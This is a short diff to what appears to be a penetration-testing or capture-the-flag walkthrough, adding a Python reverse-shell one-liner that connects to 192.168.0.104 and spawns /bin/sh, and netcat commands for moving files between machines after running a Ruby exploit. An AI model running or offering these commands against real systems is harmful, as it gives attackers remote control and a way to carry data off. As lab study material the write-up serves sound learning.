@@ -44,3 +44,9 @@ Let's pull the exploit and run it after installing the latest version of Ruby.
 ```
 
 Luckily the exploit which we ran, automatically creates a shell and prompts us with a a minimal CLI.
+
+Get a reverse shell using Python with ```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.104",13337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```
+
+For file transfer, we can use ```nc``` utility. 
+From the receiving end, ```nc -l -v 10000 > file.txt``` <br>
+From the sending end, ```nc -w 3 IP 10000 < file.txt```
